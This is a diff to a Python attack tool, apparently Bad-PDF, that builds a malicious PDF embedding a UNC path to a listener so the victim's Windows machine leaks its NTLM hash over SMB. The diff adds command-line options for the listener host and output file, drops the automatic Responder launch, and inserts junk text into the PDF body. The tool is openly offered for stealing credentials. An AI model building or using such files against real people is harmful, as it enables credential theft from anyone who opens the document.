@@ -3,6 +3,7 @@
 from __future__ import print_function
 import io
 import os
+from argparse import ArgumentParser
 import subprocess
 """" 
 ====================================================================================================================
@@ -17,9 +18,10 @@ import subprocess
         Author : Deepu TV ; Alias DeepZec
 ====================================================================================================================        
 """
+parser = ArgumentParser(description='This is tool use technique disclosed by the check point team to steal the NTLM hash using malicious PDF file.')
+parser.add_argument('--listener', '-l', help='IP or hostname of SMB listener')
+parser.add_argument('--outfile', '-o', help='Name of PDF to write out')
 
-responder = '/usr/bin/responder'
-interface = 'eth0'
 RED, WHITE, CYAN, GREEN, END = '\033[91m', '\33[46m', '\033[36m', '\033[1;32m', '\033[0m'
 
 
@@ -81,7 +83,7 @@ BT
 /TI_0 1 Tf
 14 0 0 14 10.000 753.976 Tm
 0.0 0.0 0.0 rg
-(PDF Document) Tj
+(PDF Documentdfdfdfdf) Tj
 ET
 endstream
 endobj
@@ -114,22 +116,13 @@ if __name__ == "__main__":
         """)
 
 
-        if os.path.isfile(responder):
-            print("Responder detected :%s" %responder )
-
-        else:
-            print("Responder not found..")
-            responder = raw_input("Please enter responder path (Default /usr/bin/responder): \n")
-
-        host = raw_input("Please enter Bad-PDF host IP: \n")
-        filename = raw_input("Please enter output file name: \n")
-        interface = raw_input("Please enter the interface name to listen(Default eth0): \n")
+        args = parser.parse_args()
+        host = args.listener 
+        filename = args.outfile
 
         create_malpdf(filename, '\\' + '\\' + host + '\\')
 
         print("Bad PDF %s created" %filename)
-
-        subprocess.Popen(responder + ' -I ' + interface, shell=True).wait()
 
     except KeyboardInterrupt:
         exit(0)
